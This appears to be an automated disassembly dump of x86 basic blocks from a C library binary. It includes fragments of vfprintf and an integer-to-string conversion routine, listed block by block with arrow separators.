0xb042e43:	cmp	byte ptr [edi - 1], al
0xb042e46:	jne	0xb042d20
None
|
|
|
v
0xb042e33:	add	edi, dword ptr [esp + 0x10]
0xb042e37:	cmp	byte ptr [esp + 0x16], 0
0xb042e3c:	je	0xb042e81
None
|
|
|
v
0xb042e29:	cmp	dword ptr [esp + 0x30], ebp
0xb042e2d:	ja	0xb042d30
None
|
|
|
v
0xb042e4c:	mov	eax, dword ptr [esp + 0x38]
0xb042e50:	mov	dword ptr [esp + 4], edi
0xb042e54:	add	eax, 1
0xb042e57:	jmp	0xb042e7a
None
|
|
|
v
0xb042d05:	mov	eax, dword ptr [esp + 0x30]
0xb042d09:	cmp	dword ptr [esp + 0x34], eax
0xb042d0d:	cmovae	eax, dword ptr [esp + 0x34]
0xb042d12:	add	esp, 0x20
0xb042d15:	pop	esi
0xb042d16:	pop	edi
0xb042d17:	pop	ebp
0xb042d18:	ret	
None
|
|
|
v
0xb042c4c:	mov	eax, dword ptr [esp + 0x34]
0xb042c50:	lea	edi, dword ptr [eax - 1]
0xb042c53:	cmp	dword ptr [esp + 0x30], edi
0xb042c57:	ja	0xb042d30
None
|
|
|
v
0xb042db0:	mov	esi, dword ptr [esp + 4]
0xb042db4:	add	eax, 1
0xb042db7:	sub	dword ptr [esp + 4], 1
0xb042dbc:	movzx	esi, byte ptr [esi - 2]
0xb042dc0:	mov	ecx, esi
0xb042dc2:	cmp	dl, cl
0xb042dc4:	jne	0xb042e98
None
|
|
|
v
0xb042cf7:	mov	eax, dword ptr [esp + 0x34]
0xb042cfb:	cmp	dword ptr [esp + 0x30], eax
0xb042cff:	jb	0xb042c4c
None
|
|
|
v
0xb042d75:	cmp	dword ptr [esp + 0x30], ebp
0xb042d79:	ja	0xb042ef0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b043170
TOTAL BLOCKS :14
0xb0431aa:	cmp	ebp, 8
0xb0431ad:	je	0xb0431e8
None
|
|
|
v
0xb0431c5:	pop	ebx
0xb0431c6:	mov	eax, esi
0xb0431c8:	pop	esi
0xb0431c9:	pop	edi
0xb0431ca:	pop	ebp
0xb0431cb:	ret	
None
|
|
|
v
0xb0431a5:	cmp	ebp, 0x10
0xb0431a8:	je	0xb0431d0
None
|
|
|
v
0xb04317d:	add	ebx, 0x167e83
0xb043183:	mov	ebp, dword ptr [esp + 0x1c]
0xb043187:	mov	ecx, dword ptr [esp + 0x14]
0xb04318b:	mov	esi, dword ptr [esp + 0x18]
0xb04318f:	test	eax, eax
0xb043191:	lea	edi, dword ptr [ebx - 0x508a0]
0xb043197:	lea	eax, dword ptr [ebx - 0x50860]
0xb04319d:	cmovne	edi, eax
0xb0431a0:	cmp	ebp, 0xa
0xb0431a3:	je	0xb043200
None
|
|
|
v
0xb043208:	mov	eax, ecx
0xb04320a:	sub	esi, 1
0xb04320d:	mul	ebp
0xb04320f:	shr	edx, 3
0xb043212:	lea	eax, dword ptr [edx + edx*4]
0xb043215:	add	eax, eax
0xb043217:	sub	ecx, eax
0xb043219:	test	edx, edx
0xb04321b:	movzx	eax, byte ptr [edi + ecx]
0xb04321f:	mov	ecx, edx
0xb043221:	mov	byte ptr [esi], al
0xb043223:	jne	0xb043208
None
|
|
|
v
0xb0431e5:	jmp	0xb0431c5
None
|
|
|
v
0xb043225:	pop	ebx
0xb043226:	mov	eax, esi
0xb043228:	pop	esi
0xb043229:	pop	edi
0xb04322a:	pop	ebp
0xb04322b:	ret	
None
|
|
|
v
0xb0431e8:	mov	eax, ecx
0xb0431ea:	sub	esi, 1
0xb0431ed:	and	eax, 7
0xb0431f0:	movzx	eax, byte ptr [edi + eax]
0xb0431f4:	shr	ecx, 3
0xb0431f7:	test	ecx, ecx
0xb0431f9:	mov	byte ptr [esi], al
0xb0431fb:	jne	0xb0431e8
None
|
|
|
v
0xb0431b0:	mov	eax, ecx
0xb0431b2:	xor	edx, edx
0xb0431b4:	div	ebp
0xb0431b6:	sub	esi, 1
0xb0431b9:	movzx	edx, byte ptr [edi + edx]
0xb0431bd:	test	eax, eax
0xb0431bf:	mov	ecx, eax
0xb0431c1:	mov	byte ptr [esi], dl
0xb0431c3:	jne	0xb0431b0
None
|
|
|
v
0xb0431af:	nop	
None
|
|
|
v
0xb0431d0:	mov	eax, ecx
0xb0431d2:	sub	esi, 1
0xb0431d5:	and	eax, 0xf
0xb0431d8:	movzx	eax, byte ptr [edi + eax]
0xb0431dc:	shr	ecx, 4
0xb0431df:	test	ecx, ecx
0xb0431e1:	mov	byte ptr [esi], al
0xb0431e3:	jne	0xb0431d0
None
|
|
|
v
0xb043200:	mov	ebp, 0xcccccccd
0xb043205:	lea	esi, dword ptr [esi]
0xb043208:	mov	eax, ecx
0xb04320a:	sub	esi, 1
0xb04320d:	mul	ebp
0xb04320f:	shr	edx, 3
0xb043212:	lea	eax, dword ptr [edx + edx*4]
0xb043215:	add	eax, eax
0xb043217:	sub	ecx, eax
0xb043219:	test	edx, edx
0xb04321b:	movzx	eax, byte ptr [edi + ecx]
0xb04321f:	mov	ecx, edx
0xb043221:	mov	byte ptr [esi], al
0xb043223:	jne	0xb043208
None
|
|
|
v
0xb0431fd:	jmp	0xb0431c5
None
|
|
|
v
0xb043170:	push	ebp
0xb043171:	push	edi
0xb043172:	push	esi
0xb043173:	push	ebx
0xb043174:	mov	eax, dword ptr [esp + 0x20]
0xb043178:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:vfprintf
TOTAL BLOCKS :200
0xb04386b:	mov	eax, dword ptr [esi]
0xb04386d:	test	al, 8
0xb04386f:	jne	0xb045b90
None
|
|
|
v
0xb043859:	mov	eax, dword ptr [esi + 0x68]
0xb04385c:	test	eax, eax
0xb04385e:	jne	0xb0439c8
None
|
|
|
v
0xb0460c9:	mov	eax, dword ptr [ebx + 0x3768]
0xb0460cf:	test	eax, eax
0xb0460d1:	je	0xb0461e3
None
|
|
|
v
0xb0438a6:	test	al, 2
0xb0438a8:	jne	0xb0439d8
None
|
|
|
v
0xb0439a5:	mov	eax, dword ptr [ebp - 0x44c]
0xb0439ab:	lea	esp, dword ptr [ebp - 0xc]
0xb0439ae:	pop	ebx
0xb0439af:	pop	esi
0xb0439b0:	pop	edi
0xb0439b1:	pop	ebp
0xb0439b2:	ret	
None
|
|
|
v
0xb0462b0:	lea	eax, dword ptr [ebx - 0x165bcc]
0xb0462b6:	mov	ecx, eax
0xb0462b8:	mov	dword ptr [ebp - 0x468], eax
0xb0462be:	lea	eax, dword ptr [ebx - 0x165844]
0xb0462c4:	sub	eax, ecx
0xb0462c6:	jmp	0xb046217
None
|
|
|
v
0xb045ed8:	mov	eax, dword ptr [ebp - 0x454]
0xb045ede:	mov	ecx, dword ptr [ebx - 0xdc]
0xb045ee4:	mov	dword ptr [eax + ecx], 0x16
0xb045eeb:	jmp	0xb0439d1
None
|
|
|
v
0xb0460ef:	mov	edx, dword ptr [ecx + 0x2c]
0xb0460f2:	shl	edx, 2
0xb0460f5:	mov	dword ptr [ebp - 0x4f0], edx
0xb0460fb:	add	edx, 0x1e
0xb0460fe:	and	edx, 0xfffffff0
0xb046101:	sub	esp, edx
0xb046103:	lea	edx, dword ptr [esp + 0x23]
0xb046107:	and	edx, 0xfffffff0
0xb04610a:	mov	dword ptr [ebp - 0x4d4], edx
0xb046110:	mov	edx, dword ptr [ecx + 0x2c]
0xb046113:	test	edx, edx
0xb046115:	je	0xb046170
None
|
|
|
v
0xb045da6:	mov	esi, dword ptr [ebp + 8]
0xb045da9:	test	byte ptr [esi + 0x3c], 4
0xb045dad:	jne	0xb045eca
None
|
|
|
v
0xb045e80:	mov	eax, dword ptr [ebp - 0x440]
0xb045e86:	lea	esi, dword ptr [eax + 8]
0xb045e89:	mov	edi, dword ptr [eax + 4]
0xb045e8c:	mov	dword ptr [ebp - 0x440], esi
0xb045e92:	mov	esi, dword ptr [eax]
0xb045e94:	mov	eax, dword ptr [ebp - 0x468]
0xb045e9a:	mov	dword ptr [eax], esi
0xb045e9c:	mov	dword ptr [eax + 4], edi
0xb045e9f:	jmp	0xb045e20
None
|
|
|
v
0xb0485bd:	mov	eax, dword ptr [ebp - 0x46c]
0xb0485c3:	mov	dword ptr [esp], eax
0xb0485c6:	call	0xb017470
None
|
|
|
v
0xb045d92:	test	eax, eax
0xb045d94:	jns	0xb045e40
None
|
|
|
v
0xb0461a7:	mov	edx, 0x7fffffff
0xb0461ac:	sub	edx, dword ptr [ebp - 0x44c]
0xb0461b2:	add	dword ptr [ebp - 0x44c], eax
0xb0461b8:	cmp	eax, edx
0xb0461ba:	jbe	0xb044de1
None
|
|
|
v
0xb045bc6:	jmp	0xb044d78
None
|
|
|
v
0xb043886:	mov	ecx, dword ptr [ebx - 0xf8]
0xb04388c:	test	ecx, ecx
0xb04388e:	je	0xb046315
None
|
|
|
v
0xb048588:	mov	dword ptr [esp], ecx
0xb04858b:	mov	dword ptr [ebp - 0x470], ecx
0xb048591:	call	0xb0f8ac0
None
|
|
|
v
0xb045d4d:	lea	eax, dword ptr [ebp - 0x440]
0xb045d53:	xor	edx, edx
0xb045d55:	mov	edi, dword ptr [ebp - 0x494]
0xb045d5b:	mov	dword ptr [ebp - 0x46c], eax
0xb045d61:	mov	eax, dword ptr [ebp - 0x470]
0xb045d67:	test	eax, eax
0xb045d69:	je	0xb044e66
None
|
|
|
v
0xb0460d7:	movsx	edx, byte ptr [ebp - 0x468]
0xb0460de:	mov	dword ptr [ebp - 0x4d8], edx
0xb0460e4:	mov	edx, dword ptr [eax + edx*4]
0xb0460e7:	test	edx, edx
0xb0460e9:	je	0xb0461e3
None
|
|
|
v
0xb043b38:	mov	dword ptr [edx + 8], 0
0xb043b3f:	cmp	dword ptr gs:[0xc], 0
0xb043b47:	je	0xb043b4a
None
|
|
|
v
0xb046037:	mov	eax, dword ptr [ecx + 0x1c]
0xb04603a:	cmp	eax, 0xff
0xb04603d:	je	0xb04605b
None
|
|
|
v
0xb044e78:	mov	dword ptr [ebp - 0x46c], 0
0xb044e82:	jmp	0xb043dae
None
|
|
|
v
0xb043941:	add	dword ptr [edx + 4], 1
0xb043945:	mov	edi, dword ptr [ebp - 0x458]
0xb04394b:	movsx	eax, byte ptr [esi + 0x46]
0xb04394f:	sub	edi, dword ptr [ebp + 0xc]
0xb043952:	mov	eax, dword ptr [esi + eax + 0x94]
0xb043959:	mov	dword ptr [ebp - 0x44c], edi
0xb04395f:	mov	dword ptr [esp + 8], edi
0xb043963:	mov	ecx, dword ptr [ebp + 0xc]
0xb043966:	mov	dword ptr [esp], esi
0xb043969:	mov	dword ptr [esp + 4], ecx
0xb04396d:	call	dword ptr [eax + 0x1c]
None
|
|
|
v
0xb044d4f:	mov	dword ptr [esp + 8], edi
0xb044d53:	mov	eax, dword ptr [ebp - 0x460]
0xb044d59:	mov	dword ptr [esp + 4], eax
0xb044d5d:	mov	eax, dword ptr [ebp - 0x470]
0xb044d63:	mov	dword ptr [esp], eax
0xb044d66:	call	0xb07c960
None
|
|
|
v
0xb0439ab:	lea	esp, dword ptr [ebp - 0xc]
0xb0439ae:	pop	ebx
0xb0439af:	pop	esi
0xb0439b0:	pop	edi
0xb0439b1:	pop	ebp
0xb0439b2:	ret	
None
|
|
|
v
0xb045eca:	lea	eax, dword ptr [ebx - 0x45cdc]
0xb045ed0:	mov	dword ptr [esp], eax
0xb045ed3:	call	0xb068fe0
None
|
|
|
v
0xb045e60:	cmp	eax, 7
0xb045e63:	jg	0xb045ea8
None
|
|
|
v
0xb043a2b:	mov	edx, dword ptr [ebx + 0xecc]
0xb043a31:	test	edx, edx
0xb043a33:	jne	0xb044bdc
None
|
|
|
v
0xb043875:	mov	edi, dword ptr [ebp + 0xc]
0xb043878:	test	edi, edi
0xb04387a:	je	0xb045ed8
None
|
|
|
v
0xb0484b9:	test	eax, eax
0xb0484bb:	jne	0xb045c13
None
|
|
|
v
0xb046117:	mov	eax, dword ptr [ecx + 0x24]
0xb04611a:	mov	edx, dword ptr [ebp - 0x494]
0xb046120:	mov	dword ptr [ebp - 0x4f4], edi
0xb046126:	lea	eax, dword ptr [eax + eax*2]
0xb046129:	lea	edx, dword ptr [edx + eax*4]
0xb04612c:	mov	eax, dword ptr [ebp - 0x4d4]
0xb046132:	mov	dword ptr [ebp - 0x4e0], eax
0xb046138:	mov	eax, dword ptr [ebp - 0x4f0]
0xb04613e:	add	eax, dword ptr [ebp - 0x4d4]
0xb046144:	mov	dword ptr [ebp - 0x4f0], eax
0xb04614a:	mov	eax, dword ptr [ebp - 0x4e0]
0xb046150:	mov	edi, dword ptr [ebp - 0x4f0]
0xb046156:	nop	
0xb046158:	mov	dword ptr [eax], edx
0xb04615a:	add	eax, 4
0xb04615d:	add	edx, 0xc
0xb046160:	cmp	eax, edi
0xb046162:	jne	0xb046158
None
|
|
|
v
0xb046b91:	mov	dword ptr [ebp - 0x46c], ecx
0xb046b97:	mov	dword ptr [esp], edi
0xb046b9a:	call	0xb0f8ac0
None
|
|
|
v
0xb045ccc:	mov	eax, dword ptr [esi + 0x20]
0xb045ccf:	cmp	eax, 0xff
0xb045cd2:	je	0xb045cdb
None
|
|
|
v
0xb046197:	cmp	dword ptr [ebp - 0x44c], 0x7ffffffe
0xb0461a1:	ja	0xb048571
None
|
|
|
v
0xb046325:	jmp	0xb0439f2
None
|
|
|
v
0xb045e20:	add	edx, 1
0xb045e23:	add	dword ptr [ebp - 0x468], 0xc
0xb045e2a:	cmp	edx, dword ptr [ebp - 0x470]
0xb045e30:	jne	0xb045d78
None
|
|
|
v
0xb044de1:	mov	eax, dword ptr [ebp - 0x46c]
0xb044de7:	test	eax, eax
0xb044de9:	jne	0xb0477aa
None
|
|
|
v
0xb043864:	mov	dword ptr [esi + 0x68], 0xffffffff
0xb04386b:	mov	eax, dword ptr [esi]
0xb04386d:	test	al, 8
0xb04386f:	jne	0xb045b90
None
|
|
|
v
0xb045ded:	cmp	eax, 0x200
0xb045df2:	je	0xb045e40
None
|
|
|
v
0xb043997:	mov	ecx, dword ptr [ebp - 0x450]
0xb04399d:	test	ecx, ecx
0xb04399f:	jne	0xb043b61
None
|
|
|
v
0xb0439d8:	mov	ecx, dword ptr [ebp + 0x10]
0xb0439db:	mov	eax, esi
0xb0439dd:	mov	edx, dword ptr [ebp + 0xc]
0xb0439e0:	call	0xb0485f0
None
|
|
|
v
0xb044d88:	mov	eax, dword ptr [ebp - 0x470]
0xb044d8e:	mov	dword ptr [ebp - 0x460], eax
0xb044d94:	jmp	0xb044ca0
None
|
|
|
v
0xb043a0f:	mov	edx, dword ptr [ebx + 0x3768]
0xb043a15:	test	edx, edx
0xb043a17:	jne	0xb044bdc
None
|
|
|
v
0xb046302:	mov	eax, dword ptr [ebp - 0x490]
0xb046308:	mov	dword ptr [esp], eax
0xb04630b:	call	0xb017470
None
|
|
|
v
0xb045cd4:	mov	dword ptr [edi + eax*4], 0
0xb045cdb:	mov	eax, dword ptr [esi + 0x1c]
0xb045cde:	cmp	eax, 0xff
0xb045ce1:	je	0xb045cea
None
|
|
|
v
0xb043a39:	lea	ecx, dword ptr [ebx - 0x165bcc]
0xb043a3f:	mov	byte ptr [ebp - 0x479], 0
0xb043a46:	mov	dword ptr [ebp - 0x490], 0
0xb043a50:	mov	dword ptr [ebp - 0x498], 0
0xb043a5a:	mov	dword ptr [ebp - 0x488], 0
0xb043a64:	mov	dword ptr [ebp - 0x484], 0xffffffff
0xb043a6e:	mov	dword ptr [ebp - 0x48c], 0
0xb043a78:	mov	dword ptr [ebp - 0x468], ecx
0xb043a7e:	lea	edx, dword ptr [eax + 1]
0xb043a81:	mov	dword ptr [ebp - 0x444], edx
0xb043a87:	movzx	eax, byte ptr [eax + 1]
0xb043a8b:	lea	edx, dword ptr [eax - 0x20]
0xb043a8e:	cmp	dl, 0x5a
0xb043a91:	mov	byte ptr [ebp - 0x480], al
0xb043a97:	mov	eax, dword ptr [ebp - 0x468]
0xb043a9d:	jbe	0xb043bd0
None
|
|
|
v
0xb043b4d:	jne	0xb04881b
None
|
|
|
v
0xb0438ca:	test	dword ptr [esi], 0x8000
0xb0438d0:	mov	dword ptr [ebp - 0x450], 0
0xb0438da:	mov	dword ptr [ebp - 0x458], eax
0xb0438e0:	mov	dword ptr [ebp - 0x444], eax
0xb0438e6:	jne	0xb043945
None
|
|
|
v
0xb046310:	jmp	0xb043dd3
None
|
|
|
v
0xb048540:	mov	dword ptr [ebp - 0x46c], 0
0xb04854a:	jmp	0xb043da4
None
|
|
|
v
0xb045b90:	or	eax, 0x20
0xb045b93:	mov	ecx, dword ptr [ebx - 0xdc]
0xb045b99:	mov	dword ptr [esi], eax
0xb045b9b:	mov	eax, dword ptr [ebp - 0x454]
0xb045ba1:	mov	dword ptr [eax + ecx], 9
0xb045ba8:	mov	eax, 0xffffffff
0xb045bad:	jmp	0xb0439ab
None
|
|
|
v
0xb043938:	mov	eax, dword ptr [esi + 0x48]
0xb04393b:	mov	edx, dword ptr [esi + 0x48]
0xb04393e:	mov	dword ptr [eax + 8], edi
0xb043941:	add	dword ptr [edx + 4], 1
0xb043945:	mov	edi, dword ptr [ebp - 0x458]
0xb04394b:	movsx	eax, byte ptr [esi + 0x46]
0xb04394f:	sub	edi, dword ptr [ebp + 0xc]
0xb043952:	mov	eax, dword ptr [esi + eax + 0x94]
0xb043959:	mov	dword ptr [ebp - 0x44c], edi
0xb04395f:	mov	dword ptr [esp + 8], edi
0xb043963:	mov	ecx, dword ptr [ebp + 0xc]
0xb043966:	mov	dword ptr [esp], esi
0xb043969:	mov	dword ptr [esp + 4], ecx
0xb04396d:	call	dword ptr [eax + 0x1c]
None
|
|
|
v
0xb045dfb:	cmp	eax, 0x107
0xb045e00:	jne	0xb045ea8
None
|
|
|
v
0xb043a1d:	mov	edi, dword ptr [ebx + 0x376c]
0xb043a23:	test	edi, edi
0xb043a25:	jne	0xb044bdc
None
|
|
|
v
0xb04618f:	test	eax, eax
0xb046191:	js	0xb043da4
None
|
|
|
v
0xb046b9f:	mov	ecx, dword ptr [ebp - 0x46c]
0xb046ba5:	test	eax, eax
0xb046ba7:	jne	0xb046089
None
|
|
|
v
0xb0439f0:	mov	eax, edx
0xb0439f2:	cmp	eax, 0xff
0xb0439f5:	jne	0xb0439d1
None
|
|
|
v
0xb045bd0:	mov	eax, dword ptr [ebp - 0x43c]
0xb045bd6:	mov	ecx, dword ptr [ebp - 0x46c]
0xb045bdc:	mov	esi, dword ptr [ebp + 8]
0xb045bdf:	cmp	ecx, eax
0xb045be1:	cmovae	eax, ecx
0xb045be4:	cmp	eax, 0x6666666
0xb045be9:	mov	dword ptr [ebp - 0x470], eax
0xb045bef:	ja	0xb04854f
None
|
|
|
v
0xb0477aa:	mov	eax, dword ptr [ebp - 0x46c]
0xb0477b0:	mov	dword ptr [esp], eax
0xb0477b3:	call	0xb017470
None
|
|
|
v
0xb045ead:	mov	esi, dword ptr [ebx + 0xecc]
0xb045eb3:	test	esi, esi
0xb045eb5:	jne	0xb0484de
None
|
|
|
v
0xb044c6c:	lea	ecx, dword ptr [ebp - 0x43c]
0xb044c72:	xor	edi, edi
0xb044c74:	mov	dword ptr [ebp + 8], esi
0xb044c77:	mov	esi, eax
0xb044c79:	mov	dword ptr [ebp - 0x46c], 0
0xb044c83:	mov	dword ptr [ebp - 0x464], 0
0xb044c8d:	mov	dword ptr [ebp - 0x468], 0x680
0xb044c97:	mov	dword ptr [ebp - 0x474], ecx
0xb044c9d:	lea	esi, dword ptr [esi]
0xb044ca0:	mov	eax, dword ptr [ebp - 0x474]
0xb044ca6:	add	edi, dword ptr [ebp - 0x460]
0xb044cac:	mov	dword ptr [esp + 0xc], eax
0xb044cb0:	mov	dword ptr [esp + 8], edi
0xb044cb4:	mov	eax, dword ptr [ebp - 0x46c]
0xb044cba:	mov	dword ptr [esp], esi
0xb044cbd:	mov	dword ptr [esp + 4], eax
0xb044cc1:	call	0xb0625f0
None
|
|
|
v
0xb0439f2:	cmp	eax, 0xff
0xb0439f5:	jne	0xb0439d1
None
|
|
|
v
0xb0462cb:	mov	dword ptr [ecx], 0xffffffff
0xb0462d1:	mov	dword ptr [ebp - 0x470], 0xffffffff
0xb0462db:	jmp	0xb04605b
None
|
|
|
v
0xb0438e8:	mov	eax, dword ptr [ebx + 0x38d8]
0xb0438ee:	test	eax, eax
0xb0438f0:	mov	dword ptr [ebp - 0x450], eax
0xb0438f6:	jne	0xb043b90
None
|
|
|
v
0xb04603f:	mov	edx, dword ptr [ebp - 0x494]
0xb046045:	lea	eax, dword ptr [eax + eax*2]
0xb046048:	mov	eax, dword ptr [edx + eax*4]
0xb04604b:	test	eax, eax
0xb04604d:	js	0xb0462cb
None
|
|
|
v
0xb045de0:	cmp	eax, 0x100
0xb045de5:	je	0xb045e80
None
|
|
|
v
0xb046315:	mov	dword ptr [esp + 4], 0xffffffff
0xb04631d:	mov	dword ptr [esp], esi
0xb046320:	call	0xb066ae0
None
|
|
|
v
0xb048571:	lea	eax, dword ptr [ebx - 0x4a6f8]
0xb048577:	mov	dword ptr [esp + 0xc], eax
0xb04857b:	mov	dword ptr [esp + 8], 0x7f7
0xb048583:	jmp	0xb046b79
None
|
|
|
v
0xb045f32:	imul	eax, dword ptr [ebp - 0x488], 0x34
0xb045f39:	mov	ecx, dword ptr [ebp - 0x460]
0xb045f3f:	add	ecx, eax
0xb045f41:	movzx	edi, byte ptr [ecx + 0xc]
0xb045f45:	mov	edx, edi
0xb045f47:	shr	dl, 3
0xb045f4a:	mov	byte ptr [ebp - 0x474], dl
0xb045f50:	mov	edx, edi
0xb045f52:	shr	dl, 4
0xb045f55:	mov	byte ptr [ebp - 0x478], dl
0xb045f5b:	mov	edx, edi
0xb045f5d:	shr	dl, 5
0xb045f60:	mov	eax, edx
0xb045f62:	mov	edx, edi
0xb045f64:	shr	dl, 6
0xb045f67:	and	eax, 1
0xb045f6a:	mov	byte ptr [ebp - 0x4d0], dl
0xb045f70:	mov	edx, edi
0xb045f72:	shr	dl, 7
0xb045f75:	mov	byte ptr [ebp - 0x4e4], dl
0xb045f7b:	mov	edx, edi
0xb045f7d:	and	edx, 1
0xb045f80:	mov	byte ptr [ebp - 0x4ec], dl
0xb045f86:	mov	edx, edi
0xb045f88:	shr	dl, 1
0xb045f8a:	mov	byte ptr [ebp - 0x47b], dl
0xb045f90:	movzx	edx, byte ptr [ecx + 0xd]
0xb045f94:	mov	dword ptr [ebp - 0x4dc], eax
0xb045f9a:	and	byte ptr [ebp - 0x474], 1
0xb045fa1:	and	byte ptr [ebp - 0x478], 1
0xb045fa8:	mov	eax, edx
0xb045faa:	shr	al, 1
0xb045fac:	mov	byte ptr [ebp - 0x4e8], al
0xb045fb2:	mov	eax, edi
0xb045fb4:	shr	al, 2
0xb045fb7:	mov	byte ptr [ebp - 0x4f8], al
0xb045fbd:	mov	eax, dword ptr [ecx + 4]
0xb045fc0:	shr	dl, 3
0xb045fc3:	mov	byte ptr [ebp - 0x4fc], dl
0xb045fc9:	and	byte ptr [ebp - 0x4d0], 1
0xb045fd0:	and	byte ptr [ebp - 0x47b], 1
0xb045fd7:	and	byte ptr [ebp - 0x4e8], 1
0xb045fde:	and	byte ptr [ebp - 0x4f8], 1
0xb045fe5:	and	byte ptr [ebp - 0x4fc], 1
0xb045fec:	mov	dword ptr [ebp - 0x4cc], eax
0xb045ff2:	mov	eax, dword ptr [ecx]
0xb045ff4:	mov	dword ptr [ebp - 0x470], eax
0xb045ffa:	mov	eax, dword ptr [ecx + 0x10]
0xb045ffd:	mov	dword ptr [ebp - 0x500], eax
0xb046003:	mov	edx, dword ptr [ecx + 0x20]
0xb046006:	mov	eax, dword ptr [ecx + 8]
0xb046009:	cmp	edx, 0xff
0xb04600c:	mov	dword ptr [ebp - 0x468], eax
0xb046012:	mov	byte ptr [ebp - 0x47c], al
0xb046018:	je	0xb046037
None
|
|
|
v
0xb045c86:	mov	eax, edi
0xb045c88:	mov	edi, ecx
0xb045c8a:	mov	dword ptr [ebp + 8], esi
0xb045c8d:	mov	esi, edx
0xb045c8f:	mov	dword ptr [ebp - 0x468], eax
0xb045c95:	jmp	0xb045ccc
None
|
|
|
v
0xb04629e:	lea	edi, dword ptr [ebp - 0x18]
0xb0462a1:	mov	dword ptr [ebp - 0x46c], 0
0xb0462ab:	jmp	0xb0460c9
None
|
|
|
v
0xb0485b2:	mov	dword ptr [ebp - 0x470], eax
0xb0485b8:	jmp	0xb044d4f
None
|
|
|
v
0xb046217:	movzx	ecx, byte ptr [ebp - 0x474]
0xb04621e:	mov	dword ptr [ebp - 0x4e0], ecx
0xb046224:	movzx	ecx, byte ptr [ebp - 0x478]
0xb04622b:	mov	dword ptr [ebp - 0x4d4], ecx
0xb046231:	movzx	ecx, byte ptr [ebp - 0x4d0]
0xb046238:	mov	dword ptr [ebp - 0x4d8], ecx
0xb04623e:	movzx	ecx, byte ptr [ebp - 0x4e4]
0xb046245:	mov	dword ptr [ebp - 0x4f4], ecx
0xb04624b:	movzx	ecx, byte ptr [ebp - 0x4ec]
0xb046252:	mov	dword ptr [ebp - 0x4ec], ecx
0xb046258:	movzx	ecx, byte ptr [ebp - 0x47b]
0xb04625f:	mov	dword ptr [ebp - 0x4e4], ecx
0xb046265:	movzx	ecx, byte ptr [ebp - 0x4e8]
0xb04626c:	mov	dword ptr [ebp - 0x4f0], ecx
0xb046272:	movzx	ecx, byte ptr [ebp - 0x4f8]
0xb046279:	mov	dword ptr [ebp - 0x4e8], ecx
0xb04627f:	movzx	ecx, byte ptr [ebp - 0x4fc]
0xb046286:	mov	dword ptr [ebp - 0x4f8], ecx
0xb04628c:	movzx	ecx, byte ptr [ebp - 0x500]
0xb046293:	mov	byte ptr [ebp - 0x47b], cl
0xb046299:	jmp	0xb0449e0
None
|
|
|
v
0xb045cf1:	cmp	eax, 1
0xb045cf4:	je	0xb045c98
None
|
|
|
v
0xb044e66:	mov	eax, dword ptr [ebp - 0x488]
0xb044e6c:	cmp	dword ptr [ebp - 0x464], eax
0xb044e72:	ja	0xb045f32
None
|
|
|
v
0xb044cf6:	lea	ecx, dword ptr [eax + eax]
0xb044cf9:	cmp	ecx, 0x1000
0xb044cff:	ja	0xb048588
None
|
|
|
v
0xb045cb0:	add	dword ptr [ebp - 0x468], 1
0xb045cb7:	add	esi, 0x34
0xb045cba:	mov	eax, dword ptr [ebp - 0x464]
0xb045cc0:	cmp	dword ptr [ebp - 0x468], eax
0xb045cc6:	je	0xb045d48
None
|
|
|
v
0xb045bf5:	mov	eax, dword ptr [ebp - 0x470]
0xb045bfb:	lea	eax, dword ptr [eax + eax*4]
0xb045bfe:	lea	edx, dword ptr [eax*4]
0xb045c05:	cmp	edx, 0x1000
0xb045c0b:	mov	edi, edx
0xb045c0d:	ja	0xb0484ab
None
|
|
|
v
0xb0461c8:	mov	dword ptr [ebp - 0x470], 0
0xb0461d2:	xor	edi, edi
0xb0461d4:	mov	dword ptr [ebp - 0x464], 0
0xb0461de:	jmp	0xb045c13
None
|
|
|
v
0xb0449e0:	add	eax, dword ptr [ebp - 0x468]
0xb0449e6:	jmp	eax
None
|
|
|
v
0xb045ea8:	test	ah, 8
0xb045eab:	jne	0xb045e40
None
|
|
|
v
0xb045d9a:	cmp	eax, 0xff
0xb045d9d:	lea	esi, dword ptr [esi]
0xb045da0:	jne	0xb045ea8
None
|
|
|
v
0xb043aa3:	mov	dword ptr [ebp - 0x46c], 0
0xb043aad:	lea	edi, dword ptr [ebp - 0x18]
0xb043ab0:	mov	dword ptr [ebp - 0x4b0], 0
0xb043aba:	mov	dword ptr [ebp - 0x4ac], 0
0xb043ac4:	mov	dword ptr [ebp - 0x4a4], 0
0xb043ace:	mov	dword ptr [ebp - 0x4b4], 0
0xb043ad8:	mov	dword ptr [ebp - 0x4c0], 0
0xb043ae2:	mov	dword ptr [ebp - 0x4b8], 0
0xb043aec:	mov	dword ptr [ebp - 0x4bc], 0
0xb043af6:	mov	dword ptr [ebp - 0x4a8], 0
0xb043b00:	mov	dword ptr [ebp - 0x4c4], 0
0xb043b0a:	mov	dword ptr [ebp - 0x4a0], 0
0xb043b14:	mov	dword ptr [ebp - 0x49c], 0xffffffff
0xb043b1e:	mov	dword ptr [ebp - 0x4c8], 0
0xb043b28:	mov	byte ptr [ebp - 0x47a], 0x20
0xb043b2f:	jmp	eax
None
|
|
|
v
0xb0483b9:	lea	eax, dword ptr [ebx - 0x4a6f8]
0xb0483bf:	mov	dword ptr [esp + 0xc], eax
0xb0483c3:	mov	dword ptr [esp + 8], 0x826
0xb0483cb:	jmp	0xb046cf3
None
|
|
|
v
0xb045e40:	mov	eax, dword ptr [ebp - 0x440]
0xb045e46:	mov	edi, dword ptr [ebp - 0x468]
0xb045e4c:	lea	esi, dword ptr [eax + 4]
0xb045e4f:	mov	dword ptr [ebp - 0x440], esi
0xb045e55:	mov	eax, dword ptr [eax]
0xb045e57:	mov	dword ptr [edi], eax
0xb045e59:	jmp	0xb045e20
None
|
|
|
v
0xb044d78:	cmp	dword ptr [ebp - 0x468], 0x1000
0xb044d82:	ja	0xb0474f8
None
|
|
|
v
0xb046bbb:	mov	ecx, dword ptr [ebp - 0x4d4]
0xb046bc1:	test	eax, eax
0xb046bc3:	mov	dword ptr [ebp - 0x46c], eax
0xb046bc9:	je	0xb043da4
None
|
|
|
v
0xb047506:	mov	ecx, dword ptr [ebp - 0x470]
0xb04750c:	mov	dword ptr [ebp - 0x460], ecx
0xb047512:	movzx	ecx, byte ptr [ebp - 0x479]
0xb047519:	test	eax, eax
0xb04751b:	mov	eax, 1
0xb047520:	cmove	ecx, eax
0xb047523:	mov	byte ptr [ebp - 0x479], cl
